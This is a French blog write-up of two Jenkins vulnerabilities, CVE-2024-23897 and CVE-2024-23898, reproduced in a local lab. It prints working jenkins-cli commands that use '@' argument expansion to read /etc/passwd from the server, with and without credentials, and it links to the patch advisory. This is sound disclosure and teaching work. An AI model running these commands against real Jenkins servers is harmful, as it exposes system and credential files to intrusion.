# Jenkins : Deux vulnérabilités critiques (𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳 - 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵8) Exploitation & Correctifs



## Introduction

Les chercheurs en sécurité de SonarSource ont découvert deux failles de sécurité dans Jenkins : CVE-2024-23897 et CVE-2024-23898. Jenkins a été informé de la découverte de ces vulnérabilités le 13 novembre 2023.

Deux vulnérabilités sont expliquées :

* 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳 : 

C'est une vulnérabilité qui permet à un attaquant non authentifié, et disposant de la permission "overall/read", de lire les données des fichiers présents sur le serveur. Sans cette permission, il est possible de lire les premières lignes des fichiers. 

	Versions vulnérables : Les versions antérieures à 2.442 et 2.426.3 LTS

* 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟴 : 

󠁝󠀠C'est une vulnérabilité qui  permet à un attaquant d'exécuter des commandes à distance en incitant un utilisateur à cliquer sur un lien malveillant. Elle est de type "cross-site WebSocket hijacking (CSWSH)".

	Versions vulnérables : La version 2.217 à la version 2.441 (incluses toutes deux), LTS de la version 2.222.1 à la version 2.426.2 
	(toutes deux incluses).


  ## Exploitation de 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳


J'ai hosté Jenkins avec le projet Vulnhub disponible sur https://github.com/vulhub/vulhub.

![VulnHub](/images/jenkinslocalhost.png)

* Détection de la vulnérabilité 

![Nuclei](/images/jenkinsnuclei.png)


* Exploitation de la vulnérabilité 

Un utilisateur disposant des identifiants de connexion peut lire un fichier au complet (exemple : /etc/passwd). 

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ -auth admin:admin connect-node "@/etc/passwd"
```
![Utilisateur authentifié](/images/jenkins_user_authentified.png)


Un attaquant non authentifié ou sans les autorisations de lecture globales nécessaires, peut seulement lire 3 lignes : Lire la première ligne 

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ who-am-i "@/etc/passwd"
```

![POC 1](/images/poc1.png)


Lire la deuxième ligne 

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ enable-job "@/etc/passwd"
```
![POC 2](/images/poc21.png)


Lire la troisième ligne 

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ help "@/etc/passwd"
```

![POC 3](/images/poc31.png)



## Exploitation de 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟴

On installe Jenkins 2.440 qui est une version vulnérable avec Docker.

Les commandes suivantes permettent d'installer et de lancer Jenkins en local.

```
sudo docker pull jenkins/jenkins:2.440-jdk17
```

```
sudo docker run -p 8080:8080 jenkins/jenkins:2.440-jdk17

```

![Dashboard Jenkins 2.440](/images/dashboardjenkins.png)

* Exploitation de la vulnérabilité 


{{< youtube 7Ox6g7S-1ag >}}


## Correctifs

Mettre à jour la dernière version de Jenkins. Un correctif est déjà disponible.

https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
